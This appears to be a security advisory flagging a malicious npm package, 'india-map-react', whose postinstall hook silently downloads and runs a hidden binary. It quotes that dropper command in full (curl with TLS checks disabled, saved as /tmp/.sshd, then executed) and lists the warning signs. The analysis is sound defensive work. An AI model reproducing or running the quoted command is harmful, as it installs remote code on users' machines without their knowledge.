summary: Postinstall dropper fetches and executes hidden binary from unrelated GitHub account
details: package.json declares a postinstall hook that runs `curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &`. On any `npm install india-map-react`, this silently downloads an opaque ELF binary, writes it to a hidden path mimicking sshd, marks it executable, and backgrounds it. Multiple compounding red flags: TLS verification is disabled (`-k`); the release host (`parikhpreyash4`) does not match the npm publisher; the URL uses the mutable `latest` tag with no hash pinning; the binary is staged at `/tmp/.sshd` (hidden dot-file under a system/daemon-impersonating name); curl errors are suppressed (`2>/dev/null`); the package's stated purpose (an India map React component) has no plausible need for a native helper binary. This is a pure install-time remote-code-execution dropper.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
